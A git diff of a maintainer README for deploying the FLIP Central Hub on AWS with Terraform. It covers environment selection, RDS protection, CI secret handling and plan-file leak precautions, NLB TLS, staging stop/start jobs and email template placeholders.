+> old-name fallback in `deploy/env_mode.mk` (`kit_file`).
+
+`HUB` replaced `PROD=true|stag|lza|lza-stag`, and any `PROD`
 stops make — including one still exported in the shell by an old runbook (`export PROD=…`, which `sudo -E` keeps):
 `unset PROD`, then pass `HUB=prod` (was `true`/`lza`) or `HUB=stag` (was `stag`/`lza-stag`). Rename the local
 files once:
@@ -655,8 +516,7 @@ FLIP uses no dev AWS account. Development runs entirely locally (Keycloak, the c
 >
 > **Both estates are on LZA.** `aws-stag` carries `TF_HUB=stag` and `aws-prod` carries `TF_HUB=prod`
 > (repointed 2026-10-06, [FLIP#1199](https://github.com/londonaicentre/FLIP/issues/1199)), so a merge to
-> `develop` applies to the LZA staging account and a merge to `main` applies to LZA production. The first
-> CI-applied production apply is the next `develop`→`main` release.
+> `develop` applies to the LZA staging account and a merge to `main` applies to LZA production.
 >
 > A laptop `make init` / `make plan` / `make apply HUB=prod` is therefore **break-glass**, run only under the
 > conditions in [Break-glass](#break-glass); it is reverted by the next CI run and shows up as drift in between.
@@ -678,7 +538,7 @@ account reached as `stag`.
 | --- | --- | --- |
 | Env file / kit suffix | `.env.prod` / `trust/.env.<CODE>.prod` | `.env.stag` / `trust/.env.<CODE>.stag` |
 | Profile guard | `prod` (`PROD_AWS_PROFILE`) | `stag` (`STAG_AWS_PROFILE`) |
-| `TF_VAR_environment` | `prod` — RDS deletion protection + final snapshot on | `stag` — disposable |
+| `TF_VAR_environment` | `prod` — RDS final snapshot on | `stag` — no final snapshot |
 | `deploy-centralhub` git ref | `origin/main` | `origin/develop` |
 | `LZA_VPC_NAME` | optional (defaults to the prod template name) | **required** in the env file — there is no defaultable staging VPC name, so the Makefile refuses to run without it rather than letting the lookup fail opaquely |
 | `MANAGE_DNS` | **required**, `true` or `false` (`false` while the account has no Route 53 zone) | the same |
@@ -691,16 +551,7 @@ LZA environment is its **own workload account** — never co-tenant two environm
 resource names (`flip-cluster`, `flip-api`, `flip-database-proxy`, the `/flip/networking/*` handoff params) are
 fixed per account by design.
 
-**What `HUB=prod` selects on LZA:**
-
-| Concern | Value |
-| --- | --- |
-| Env file | root `.env.prod` (gitignored, like the other env files) |
-| Profile guard | `AWS_PROFILE=prod` — a short local alias for the workload account's `FLIPAdminAccess` permission set (override via `PROD_AWS_PROFILE`) |
-| `TF_VAR_environment` | `prod` — all prod-only hardening (RDS deletion protection, final snapshot) stays on |
-| Trust kit suffix | `trust/.env.<CODE>.prod` |
-| `deploy-centralhub` git ref | `origin/main` |
-| `TF_VAR_iam_permissions_boundary_name` | **`AICentre-WorkloadRoleBoundary`** — the platform's boundary ([londonaicentre/lza#51](https://github.com/londonaicentre/lza/pull/51)), deployed by the accelerator to every workload account. An LZA SCP denies creating a role, or attaching or writing a policy onto one, unless the role carries it, so no other value works there. An env file that sets the variable itself wins — `?=` only supplies the default ([FLIP#1280](https://github.com/londonaicentre/FLIP/issues/1280)) |
+**Profile and permissions boundary.** The `prod` / `stag` profile is a short local alias for the workload account's `FLIPAdminAccess` permission set. `TF_VAR_iam_permissions_boundary_name` defaults to **`AICentre-WorkloadRoleBoundary`**, the platform's boundary ([londonaicentre/lza#51](https://github.com/londonaicentre/lza/pull/51)), which the accelerator deploys to every workload account. An LZA SCP denies creating a role, or attaching or writing a policy onto one, unless the role carries it, so no other value works there. An env file that sets the variable itself wins: `?=` only supplies the default ([FLIP#1280](https://github.com/londonaicentre/FLIP/issues/1280)).
 
 **Platform-managed vs FLIP-managed.** The account's network is owned by the accelerator pipeline
 ([londonaicentre/lza](https://github.com/londonaicentre/lza)) and VPC-layer creation is SCP-denied in-account, so
@@ -746,7 +597,7 @@ NLB DNS name) that the edge NLB and relay consume, so the workload account neces
 distribution exists. On that first apply `TF_VAR_lza_web_edge_domain` and `TF_VAR_lza_web_edge_distribution_arn`
 are still empty: the UI-bucket policy then grants no principal (fail-closed — the edge simply cannot read the
 bucket yet) and `local.ui_origin` is a placeholder. Once the edge stack is up, set both values in `.env.prod`
-(the edge distribution's default domain and its ARN) and re-apply to grant the cross-account OAC read and point
+(`ALB_SUBDOMAIN`, the only name the API answers on, and the distribution's ARN) and re-apply to grant the cross-account OAC read and point
 bucket CORS + Cognito URLs at the edge domain. This ordering is why the two variables deliberately carry no
 "required-when-LZA" validation — it would hard-fail the legitimate first apply. The operator side of
 the handoff is in the manual's [Two-phase edge handoff](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-central-hub-aws-lza.html#two-phase-edge-handoff).
@@ -763,17 +614,20 @@ Maintainer notes the manual leaves out:
   SSE-S3 by default, and on LZA production SSE-KMS under the AWS-managed `aws/s3` key (no CMK).
 - The execution role's `ecr:BatchImportUpstreamImage`/`ecr:CreateRepository` grant for first-pull imports IS
   Terraform-managed (`iam_ecs.tf`, LZA-gated); only the cache rules and their secret are out-of-band.
-- `DEMO_ASSETS_BUCKET_NAME=flip-lza-demo-assets` belongs in `.env.prod` only (staging hosts no public demo; see
-  [Ark+ demo on LZA](#ark-demo-on-lza-flip1199)); `setup-github-environments.sh` refuses to seed `aws-prod` without it.
+- `PUBLIC_DEMO=true` belongs in `.env.prod` only, once the edge's `/demo/*` behaviour is live (see
+  [Public demo](#public-demo-demo-flip1746)). It is read by `make deploy-demo` alone; CI never needs it.
 - The log buckets default to subdomain-derived names (`flip-access-logs-`/`flip-cf-logs-<ALB_SUBDOMAIN>`), and
   `ALB_SUBDOMAIN` keeps its post-cutover value on LZA, so `ACCESS_LOGS_BUCKET_NAME` is overridden into the
   `flip-lza-*` namespace — bucket names are global.
 - With `MANAGE_DNS=false` the zone lookup, every Route 53 record and both DNS-validated ACM certs are skipped. The
   workload CloudFront is gated off on LZA anyway, so `terraform output CloudfrontDistributionDomain` is null there by
-  design. The internal NLB's web listener is plain TCP until the zone lands, then TLS on the DNS-validated cert
-  (`fl_ingress_lza.tf`); flipping it is a cross-repo step, because the relay is TCP passthrough and the edge's VPC
-  origin in `aicentre-lza-iac` must switch to https-only with a matching origin host at the same time.
-- Secrets (`AES_KEY_BASE64`, `INTERNAL_SERVICE_KEY*`, `ADMIN_USER_PASSWORD`, …) were minted fresh for the account
+  design. The zone stays in the networking account, so `MANAGE_DNS` stays `false`.
+- The internal NLB's web listener is TLS, on the certificate `aicentre-lza-iac` issues into the account for
+  `ALB_SUBDOMAIN` (`fl_ingress_lza.tf`, FLIP#1797); the plan fails until it is ISSUED. The relay passes TLS through,
+  so the environment's edge origin must be https-only (`origin_tls`, aicentre-lza-iac#99). The edge checks the
+  certificate against the host it forwards, so `/api/*` answers on `ALB_SUBDOMAIN` only, never on the
+  distribution's `*.cloudfront.net` name.
+- Secrets (`AES_KEY_BASE64`, `ADMIN_USER_PASSWORD`, …) were minted fresh for the account
   during the WP3 bring-up and later replaced by the carried-over legacy **values** in the WP4 data migration (so
   existing trust kits and encrypted data stayed valid) — never reuse the legacy Secrets Manager secret itself.
 
@@ -826,9 +680,8 @@ the private platform repos.
   register them once as targets), its target group fronting `fl-server-net-1`, and the `/flip/networking/*` SSM
   handoff the networking account consumes. The full chain — internet → edge NLB → TGW → central firewall →
   internal NLB → ECS — was proven with dummy services first (FLIP#829 / PR#830).
-- **Still untested on LZA:** `full-deploy`, `make status`/`check_status.py`, `update_env.py`
-  and `make destroy`. WP3 exercises the `init`/`plan`/`apply` (+ `deploy-centralhub`/`deploy-ui`) loop first and
-  fixes up the auxiliary tooling as findings come in.
+- **Not yet exercised on LZA:** `full-deploy`, `make status`/`check_status.py`, `update_env.py` and `make destroy`.
+  The tested path is the `init`/`plan`/`apply` loop (+ `deploy-centralhub`/`deploy-ui`).
 
 ### Terraform module layout
 
@@ -849,12 +702,21 @@ deploy/providers/AWS/
 ├── service_discovery.tf        # Cloud Map private DNS namespace (flip.local) for ECS task-to-task resolution
 ├── locals.tf                   # Shared locals
 ├── cloudfront.tf               # flip-ui bucket and its cross-account OAC read for the edge distribution
-├── certificate.tf              # ACM certificate for the internal NLB's web listener (MANAGE_DNS=true)
+├── certificate.tf              # ACM certificate for the web listener where this account keeps the zone (MANAGE_DNS=true)
+├── ecs_flower.tf               # Flower-only register-supernode-keys one-shot task + run-task trigger
+├── rds_proxy.tf                # RDS Proxy + IAM DB auth
+├── kms.tf                      # FLIP application KMS key (S3 SSE-KMS, Secrets Manager)
+├── ecr.tf                      # Lifecycle policy for the ECR pull-through cache repositories
+├── s3_logging.tf               # S3 server-access-log bucket for every FLIP application bucket
+├── data.tf                     # Shared data sources
+├── backend.tf                  # S3 backend with S3 native locking
+├── variables.tf                # Terraform variables
 ├── modules/
 │   ├── cognito/                # shared: pool, domain, client, seed users
 │   ├── ses/                    # prod/stag only: sender identity, transactional templates
 │   ├── secgroup/               # shared: security-group wrapper
-│   └── flip_s3_bucket/         # shared: opinionated FLIP application S3 bucket
+│   ├── flip_s3_bucket/         # shared: opinionated FLIP application S3 bucket
+│   └── terraform_ci_bootstrap/ # CI plan/apply roles, permissions boundary, state bucket (not applied by this root)
 ```
 
 The Central Hub application services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) run on **ECS
@@ -898,10 +760,10 @@ The RDS instance behaves differently per environment, driven by `TF_VAR_environm
 | Setting                            | `stag` (`HUB=stag`) | `prod` (`HUB=prod`)            |
 | ------------------------------------ | ------------------ | ----------------------------------- |
 | `skip_final_snapshot`              | `true`           | `false`                           |
-| `deletion_protection`              | `false`          | `true`                            |
+| `deletion_protection`              | `true`           | `true`                            |
 | `final_snapshot_identifier_prefix` | `flip-database-final` | `flip-database-final`        |
 
-In production, `terraform destroy` (or any `make destroy` against the prod account) will refuse to delete the RDS instance until deletion protection is removed manually, and a final snapshot named `flip-database-final-<suffix>` is taken before deletion. Staging stays disposable so trees can be torn down and rebuilt without snapshot cleanup.
+In both environments, `terraform destroy` (or `make destroy`) refuses to delete the RDS instance until deletion protection is removed manually (Security Hub RDS.8, FLIP#1796). In production a final snapshot named `flip-database-final-<suffix>` is then taken before deletion; staging skips it, so a torn-down tree needs no snapshot cleanup.
 
 ### Status Checking
 
@@ -1015,7 +877,8 @@ and starts the stack:
 # On the trust host (trust operator) — provision, then start the stack
 # (sudo: the provisioned login user is deliberately not in the docker group)
 cd deploy/providers/AWS
-set -x ANSIBLE_BECOME_PASS (read -s -P 'Sudo password: ')   # fish; bash differs
+read -rsp 'Sudo password: ' ANSIBLE_BECOME_PASS; echo; export ANSIBLE_BECOME_PASS   # bash
+# fish: set -x ANSIBLE_BECOME_PASS (read -s -P 'Sudo password: ')
 make provision-local-trust KIT=<CODE> HUB=<stag|prod>
 cd ../../.. && sudo -E env HUB=<stag|prod> make -C trust up-trust KIT=<CODE>
 ```
@@ -1127,11 +990,10 @@ production secrets. The drift job reaches them by being dispatched onto `main`
 instead.
 
 Each holds `TF_PLAN_ROLE_ARN` and `TF_APPLY_ROLE_ARN` (the roles described in
-"Where the CI identity comes from" below, read from IAM by
+[Where the CI identity comes from](#where-the-ci-identity-comes-from) above, read from IAM by
 `scripts/setup-github-environments.sh`),
 the hub variable `TF_HUB`, and the Terraform inputs. Stored as environment
-*secrets*: `ADMIN_USER_PASSWORD`, `AES_KEY_BASE64`, `INTERNAL_SERVICE_KEY`,
-`INTERNAL_SERVICE_KEY_HASH`. Everything else is a variable, including
+*secrets*: `ADMIN_USER_PASSWORD`, `AES_KEY_BASE64`, `FL_API_KEY`. Everything else is a variable, including
 `POSTGRES_DB` / `POSTGRES_USER` — they are configuration rather than credentials
 and are rendered in the clear into the public plan comment either way
 (`variables.tf` explains the decision). The authoritative lists are
@@ -1157,7 +1019,7 @@ plan job declares `environment: aws-stag`, because that is the only way a workfl
 can read environment secrets, and the plan needs real values to be truthful. It
 runs on the pull request's own code. So **anyone with write access to this
 repository can read the staging secrets** (`AES_KEY_BASE64`,
-`INTERNAL_SERVICE_KEY`, `ADMIN_USER_PASSWORD`) by adding a step that prints them.
+`FL_API_KEY`, `ADMIN_USER_PASSWORD`) by adding a step that prints them.
 GitHub masks registered secrets in logs, but base64 or splitting the string
 defeats masking trivially — do not count on it.
 
@@ -1198,7 +1060,7 @@ To revisit, gate the plan job on a maintainer-applied label — one line in
 ### Never publish a plan file as an artifact
 
 `tf-via-pr` defaults `upload-plan` to **true**, and a Terraform plan file is a
-zip containing the full `tfstate` — `AES_KEY_BASE64`, `INTERNAL_SERVICE_KEY` and
+zip containing the full `tfstate` — `AES_KEY_BASE64`, `FL_API_KEY` and
 `ADMIN_USER_PASSWORD` in plaintext. **This repository is public**, so an uploaded
 plan is a public download of live credentials.
 
@@ -1208,9 +1070,10 @@ was deleted about an hour later and the staging secrets it contained were
 rotated. Every `tf-via-pr` step now sets `upload-plan: false`, and
 `scripts/tests/test_compose_ci_env.sh` fails the build if any step omits it.
 
-`preserve-plan` is a *different* input and stays `true` in both workflows: it
-keeps the plan on the runner's disk so the FL gate and the apply step (apply) and
-the plan-time advisory (plan) can read it. That never leaves the job.
+`preserve-plan` is a *different* input and stays `true` in both workflows. It
+keeps the plan file on the runner's disk, where the FL gate and the apply step read it
+in `terraform_apply.yml` and the advisory reads it in `terraform_plan.yml`. That file
+never leaves the job.
 
 ### Reading a red Terraform CI run
 
@@ -1226,10 +1089,9 @@ on the hub, waiting until `GET /fl/quiesce` reports deployment mode ON with no
 BUSY net, then re-running `terraform_apply.yml` via `workflow_dispatch` with
 `fl_quiesced: true`. A plain re-run reads the same plan and holds again.
 
-Note this recurs on *every* apply while a piece of out-of-band drift touches the
-FL services — staging currently carries `enable_execute_command: true -> false`
-on all three — so one quiesced apply clears the backlog rather than each push
-needing its own.
+This recurs on *every* apply while out-of-band drift touches the FL services (for example
+`enable_execute_command` switched on by hand), so one quiesced apply clears the backlog rather
+than each push needing its own.
 
 **"Production drift is not being checked."** The nightly run fires from the
 default branch and dispatches itself with `--ref main` for the production leg.
@@ -1237,7 +1099,7 @@ GitHub resolves `--ref` against the workflow file *on that ref*, so until `main`
 carries `terraform_drift.yml` the dispatch returns HTTP 422. That is a known
 precondition, not a broken pipeline, so the job warns and passes instead of
 failing — a permanently red nightly is how a real dispatch failure comes to be
-ignored. It resolves itself at the first `develop` → `main` release.
+ignored.
 
 The step recognises that precondition from an **HTTP 404 alone** when probing for
 the file on `main`. Any other outcome — a 401/403, a rate limit, a 5xx, a network
@@ -1281,14 +1143,6 @@ were not stale but **absent**, which is worse: the Makefile exports
 unconditionally or behind a `?=` default, so an absent key arrives at Terraform as
 `""` or as the Makefile's own default and **does not** fall back to the
 `variables.tf` one.
-
-The same trap was then found on **production**: `DEMO_ASSETS_BUCKET_NAME` was
-absent from the production env file while prod state carried the Ark+ demo bucket.
-`services.tf` gates `module.flip_demo_assets_bucket` on `var.DEMO_ASSETS_BUCKET_NAME != ""`,
-so an apply with the key absent plans the bucket's destroy, which `prevent_destroy`
-turns into a failed apply. It is `OPTIONAL` in the manifest because empty is
-the *correct* value on stag, which hosts no demo — which is exactly why it is
-also recovered from state here, so prod cannot be seeded without it.
 
 Do not trust a recovered value you have not seen a plan agree with.
 
@@ -1371,7 +1225,7 @@ as `EXPECTED_ENV_CLASS` (`main` → `prod`, otherwise `stag`; `stag` in
 `terraform_plan.yml`, which only ever plans staging) and the script refuses to
 compose when the two disagree. That is what keeps a mis-set `TF_HUB` from quietly
 planning the prod estate with staging's shape — the prod RDS then reads
-`deletion_protection = false` and `skip_final_snapshot = true` — in an unattended
+`skip_final_snapshot = true` — in an unattended
 apply on `main`.
 
 Run these in order **per account**, from a laptop authenticated to that account:
@@ -1494,8 +1348,7 @@ only when a path that builds one of the two images actually changed.
 **It will not disturb a training run.** Replacing `fl-server-net-1` kills any
 in-flight run (FLIP#770). A runner cannot ask the hub whether one is in flight —
 `GET /fl/quiesce` needs a Cognito session (and prod runs `ENFORCE_MFA=true`),
-CloudFront strips `X-Internal-Service-Key` at the edge, and the scheduler state
-is in a private subnet. So `scripts/check-fl-plan-impact.sh` asks the plan
+and the scheduler state is in a private subnet. So `scripts/check-fl-plan-impact.sh` asks the plan
 instead: if the plan changes `fl-server-net-1` / `fl-api-net-1` (task definition
 or service), or deletes any EFS resource, the job **holds** and names what it
 found. Everything else — IAM, S3, SSM, and a plain `flip-api` roll — applies
@@ -1684,7 +1537,7 @@ survive, which is why this is a stop and not a `terraform destroy`.
 | Plan, FL gate, apply | `terraform_apply.yml` job `apply` |
 | Restore the ECS desired counts | job `restore-staging-services`, after the gate |
 | End to end check against the deployed hub | job `staging-end-to-end` |
-| Hold, then stop | job `hold-then-stop-staging`, which calls `staging_lifecycle.yml` |
+| Hold, then stop | job `hold-then-stop-staging`, which dispatches `staging_lifecycle.yml` as its own run, so the next merge does not queue behind the window |
 | Re-stop whatever is left up | `staging_lifecycle.yml` schedule, 03:30 UTC |
 
 The ECS counts are restored *after* the FL gate on purpose. The gate holds any apply that would recreate
@@ -1695,7 +1548,8 @@ develop apply is back to needing an `fl_quiesced=true` dispatch, docs only merge
 **The hold window.** 120 minutes by default. Set the repository variable `STAGING_HOLD_MINUTES` to change the default
 for merges, or pass `hold_minutes` when dispatching `terraform_apply.yml` or `Staging Lifecycle`. To extend a window
 that is already running, dispatch `Staging Lifecycle` again with `hold-then-stop`: the second hold replaces the first
-rather than queueing a second stop behind it.
+rather than queueing a second stop behind it. A merge to `develop` during a window ends it (job `supersede-hold`),
+and its own deploy opens a new one.
 
 **Bringing staging back by hand.** Dispatch `Staging Lifecycle` with `start-stag`. It starts RDS, starts the hub host,
 waits for RDS to answer and restores the desired counts. A merge to `develop` does the same thing with no dispatch at
@@ -1706,11 +1560,9 @@ re-dispatch over the top of itself. The 03:30 UTC guard stops anything still up,
 apply or another lifecycle run is in flight. It also matters on its own account: AWS restarts a stopped RDS instance
 by itself after seven days, so without a recurring stop the database would come back every week forever.
 
-**Drift.** `terraform_drift.yml` asks whether staging is stopped before planning it, and stands down with a note on the
-summary when it is. A stopped estate cannot be planned at all, because Terraform refreshes RDS on every plan, and the three
-services at 0 would otherwise be reported as drift every night. `ecs_services.tf` carries
-`lifecycle { ignore_changes = [desired_count] }` for the same reason, so the live count belongs to the estate rather
-than to Terraform.
+**Drift.** `terraform_drift.yml` plans staging every night, stopped or not. A refresh only describes RDS, which works
+on a stopped instance, and `ecs_services.tf` carries `lifecycle { ignore_changes = [desired_count] }`, so services at 0
+are not reported as drift: the live count belongs to the estate rather than to Terraform.
 
 That `ignore_changes` is **unconditional, so it applies to production too**. A production service scaled by hand (or
 by an autoscaler) is no longer put back by an apply, and no longer shows up as drift. Production is never stopped by
@@ -1749,15 +1601,7 @@ First, run the automated status check script to identify issues:
 make status HUB=<stag|prod>
 ```
 
-This will automatically diagnose:
-
-- AWS resource health
-- Network connectivity
-- Application endpoint availability
-- Docker container status
-- System resource usage
-
-Review the output for failed checks and follow the specific troubleshooting steps below.
+It runs the checks listed under [Status Checking](#status-checking). Review the output for failed checks, then use the guide below.
 
 ### Detailed Troubleshooting Guide
 
@@ -1818,16 +1662,16 @@ commit a re-render whose only change is the graphviz that made it.
 - **Network**: the accelerator-provisioned VPC, discovered by Name tag (`network_lza.tf`): compute in its TGW-routed **app** subnets, RDS in the isolated **data** subnets. No IGW and no NAT — AWS APIs go through the estate's central interface endpoints, images through the in-account ECR pull-through cache.
 - **ECS Fargate cluster**: Runs the Central Hub application services (`flip-api`, `fl-api-net-1`, `fl-server-net-1`) as awsvpc tasks in the **app subnets**. Task definitions, services, and per-service security groups live in `ecs*.tf` and `iam_ecs.tf`.
 - **Central Hub SSM bastion**: t3.micro instance with a 10 GB root volume in a **private subnet**. It carries only the SSM managed IAM policy and a PostgreSQL client for ad-hoc RDS operations; application workloads run on ECS Fargate.
-- **Internal NLB** (`module.fl_server_internal_nlb`, `fl_ingress_lza.tf`): one static private IP per app subnet, which the networking account's edge registers once as targets. A `:443` web listener forwards to the `ecs-flip-api-lza` target group (plain TCP until `MANAGE_DNS=true`, then TLS on the ACM certificate) and an `FL_SERVER_PORT` listener to the `fl-server-net-1` target group. Its security group admits the networking ingress CIDRs and the VPC CIDR. **Why an NLB?** FLARE FL traffic is end-to-end mutual-TLS over gRPC, and a Layer 7 load balancer terminates TLS, which breaks FLARE's own certificate handshake. An NLB (Layer 4) does raw TCP pass-through, so the FL client and FL server complete their mTLS handshake untouched.
+- **Internal NLB** (`module.fl_server_internal_nlb`, `fl_ingress_lza.tf`): one static private IP per app subnet, which the networking account's edge registers once as targets. A `:443` web listener forwards to the `ecs-flip-api-lza` target group (TLS on the ACM certificate, ending at the NLB) and an `FL_SERVER_PORT` listener to the `fl-server-net-1` target group. Its security group admits the networking ingress CIDRs and the VPC CIDR. **Why an NLB?** FLARE FL traffic is end-to-end mutual-TLS over gRPC, and a Layer 7 load balancer terminates TLS, which breaks FLARE's own certificate handshake. An NLB (Layer 4) does raw TCP pass-through, so the FL client and FL server complete their mTLS handshake untouched.
 - **Edge (networking account)**: CloudFront with its WAF, serving the UI bucket over cross-account OAC and relaying `/api/*`, and an internet-facing edge NLB for FL traffic — declared in aicentre-lza-iac, not here.
-- **ACM**: one `eu-west-2` certificate for the web listener, created once `MANAGE_DNS=true`.
+- **ACM**: one `eu-west-2` certificate for the web listener, issued into the account by `aicentre-lza-iac`.
 - **Route53**: a private hosted zone resolving the FL server's bare name to the internal NLB for in-VPC callers; the public records live in the networking account.
 - **EFS**: Shared file systems and access points used by the FL services for workspace volumes (configs, certs, transfer dir). Mount targets live in the **app subnets**.
 - **Cloud Map (Service Discovery)**: Private DNS namespace `flip.local` used for ECS task-to-task resolution (e.g. `fl-api-net-1.flip.local`).
 - **RDS**: PostgreSQL 17 managed database (Terraform default, see `var.postgres_version`), in the **data subnets**. Subnet group + security group ingress restricted to the Central Hub bastion SG and the `flip-api` ECS task SG.
 - **CloudWatch**: Logging and monitoring for ECS tasks. The minimal Central Hub bastion does not run the CloudWatch agent.
 - **Secrets Manager**: Secure storage for API secrets and database credentials (`FLIP_API` secret).
-- **SSM Parameter Store**: Configuration values read by ECS tasks at startup — bucket URIs, internal service URL, internal-service-key header name.
+- **SSM Parameter Store**: Configuration values read by ECS tasks at startup — bucket URIs, internal service URL.
 - **S3 Backend**: Remote state storage with environment-specific buckets, using S3 native locking (`use_lockfile = true` in `backend.tf`; no DynamoDB lock table).
 
 ### Subnet placement at a glance
@@ -1843,17 +1687,9 @@ commit a re-render whose only change is the graphviz that made it.
 
 ### Trust Infrastructure
 
-Trust services can run on AWS EC2 or on-premises. Both models use the same Docker Compose stack. Trusts poll the Central Hub for tasks — all communication is outbound from the trust.
-
-**AWS trust** — its own Terraform root with its own state, in any AWS account and VPC:
-[`trust/deploy/terraform/aws/ec2`](../../../trust/deploy/terraform/aws/ec2/README.md) (one EC2 instance) or
-[`trust/deploy/terraform/aws/eks`](../../../trust/deploy/terraform/aws/eks/) (the Helm chart on EKS). It reads nothing
-from this root (FLIP#1438).
-
-**On-Premises Trust** — provisioned via `make provision-local-trust` and the Ansible playbook in [`trust/deploy/ansible/`](../../../trust/deploy/ansible/README.md):
-
-- Same Docker Compose stack, running on a local Ubuntu host
-- No inbound port forwarding or firewall rules needed — all trust communication is outbound
+Trusts are not deployed from this root and read nothing from it (FLIP#1438). Each is its own deployment, and all
+of its traffic to the hub is outbound. The table at the top of this README lists where each node type (AWS EC2 or
+EKS, on-prem, Kubernetes) is deployed from.
 
 ### Port configuration
 
@@ -1862,7 +1698,7 @@ Ingress at the internal NLB (not at any EC2 SG — the bastion has no inbound ru
 | Port | Load balancer | Status | Source allow-list | Purpose |
 | ---- | ------------- | ------ | ----------------- | ------- |
 | **22** | — | 🔴 **CLOSED everywhere** | n/a | SSH never exposed — remote access is via SSM Session Manager tunnel |
-| **443** | Internal NLB | 🟢 **OPEN to the edge path** | `networking_ingress_cidrs` + the VPC CIDR | `/api/*` relayed from the edge CloudFront to `flip-api` (TCP until `MANAGE_DNS=true`, then TLS) |
+| **443** | Internal NLB | 🟢 **OPEN to the edge path** | `networking_ingress_cidrs` + the VPC CIDR | `/api/*` relayed from the edge CloudFront to `flip-api` (TLS, ending at the NLB) |
 | **`FL_SERVER_PORT`** | Internal NLB | 🟢 **OPEN to the edge path** | `networking_ingress_cidrs` + the VPC CIDR | TCP/gRPC pass-through from the edge NLB to the `fl-server-net-1` Fargate task |
 
 Ports referenced internally only (no internet-facing ingress; reached only from inside the VPC or from the load balancers):
@@ -1874,8 +1710,10 @@ Ports referenced internally only (no internet-facing ingress; reached only from 
 
 ### Security-group egress
 
-The trust EC2's egress allowlist (GHSA-8465) left this root with the trust (FLIP#1438); a trust node's outbound
-destinations are listed for every node type under FLIP#1684.
+This root holds no trust, so it has no trust egress allowlist (GHSA-8465; it moved to the trust roots, FLIP#1438). A trust
+node's outbound destinations are listed under
+[Network requirements](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-trust-node.html#deploy-trust-node-network)
+(FLIP#1684).
 
 **Egress is managed inline; ingress by standalone rules.** `modules/secgroup` renders the allowlist
 into the `aws_security_group` resource's inline `egress` attribute and attaches no
@@ -1925,7 +1763,7 @@ Port 22 is **not** open in any security group: SSH is tunnelled through the SSM 
   session-manager-plugin --version  # Should output version >= 1.2.319.0
   ```
 
-- SSH key at `~/.ssh/host-aws` (configured in Step 3 of [Pre-configurations README](../../README.md#step-3-get-ssh-key-configured))
+- SSH key at `~/.ssh/host-aws` (see [Deploy the Central Hub → Prerequisites](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-central-hub.html#prerequisites))
 
 **Updating `~/.ssh/config`**
 
@@ -1970,7 +1808,7 @@ The alias resolves through the SSM tunnel — no public IP or open port 22 is ne
 | `AccessDeniedException` | `aws ssm start-session` returns access denied | Check EC2 instance IAM role has `ssm:StartSession` and `ec2messages:*` permissions (Terraform should have created this) |
 | `Connection timeout` (hanging) | SSM tunnel hangs without error | Check `aws ssm describe-instance-information` reports the instance as `Online`, verify the instance is running, and confirm its subnet reaches the estate's central SSM endpoints. No inbound SSH rule is required. |
 | `Unable to connect to SSM endpoint` | Connection fails immediately | Verify AWS_REGION matches deployment region: `echo $AWS_REGION` should match `eu-west-2` (or your region) |
-| `Bad ProxyCommand` in ~/.ssh/config | SSH config syntax error | Re-generate config: `make ssh-config` and verify it looks like the example above |
+| `Bad ProxyCommand` in ~/.ssh/config | SSH config syntax error | Re-generate config: `make ssh-config HUB=<stag\|prod>` and verify it looks like the example above |
 
 **Testing Connectivity**
 
@@ -2050,15 +1888,15 @@ Changes to template files are automatically picked up on next `terraform apply` 
 | `{{name}}` | Requestor's name | access-request |
 | `{{email}}` | Requestor's email | access-request |
 | `{{purpose}}` | Access request purpose | access-request |
-| `{{trust_name}}` | Trust name | xnat-credentials, xnat-added-to-project |
-| `{{project_name}}` | XNAT project name | xnat-credentials, xnat-added-to-project |
-| `{{project_id}}` | XNAT project ID | xnat-credentials, xnat-added-to-project |
-| `{{username}}` | XNAT username | xnat-credentials, xnat-added-to-project |
-| `{{password}}` | XNAT password | xnat-credentials |
+| `{{trust_name}}` | Trust name | xnat-invite, xnat-added-to-project |
+| `{{project_name}}` | XNAT project name | xnat-invite, xnat-added-to-project |
+| `{{project_id}}` | XNAT project ID | xnat-invite, xnat-added-to-project |
+| `{{username}}` | XNAT username | xnat-invite, xnat-added-to-project |
+| `{{setup_path}}` | Path of the set-password link, appended to the trust's XNAT address | xnat-invite |
 
 `xnat-added-to-project` is the "you already have an account, you have now been given
-access to another project" variant — same four placeholders as `xnat-credentials` minus
-`{{password}}`, since no new credential is minted.
+access to another project" variant of `xnat-invite` — the same placeholders minus
+`{{setup_path}}`, since no new credential or set-password link is minted.
 
 ### Quick Local Testing
 
@@ -2109,6 +1947,12 @@ For professional cross-client testing: [Litmus](https://www.litmus.com/) or [Ema
 Verifying the sender identity, re-verifying an expired one and leaving the SES sandbox:
 [Deploy the Central Hub → Email setup](https://londonaicentreflip.readthedocs.io/en/latest/deploy-flip/deploy-central-hub.html#email-setup). To check sending is enabled for
 the account: `aws ses get-account-sending-enabled --region <aws-region>`.
+
+The same page covers moving the sender onto the hub's own domain (`SES_SENDER_EMAIL`, then `COGNITO_EMAIL_VIA_SES`;
+both optional, unset = today's senders). On the AI Centre estates the zone for `flip.aicentre.co.uk` is in the
+networking account, so the DKIM, MAIL FROM and DMARC records are a change in `aicentre-lza-iac`, fed the
+`SesDkimTokens` output of this stack. The two keys are GitHub environment variables like every other Terraform input
+(`aws-stag`, `aws-prod`), set per environment only once its step's precondition holds.
 
 ### Troubleshooting Email Issues
 
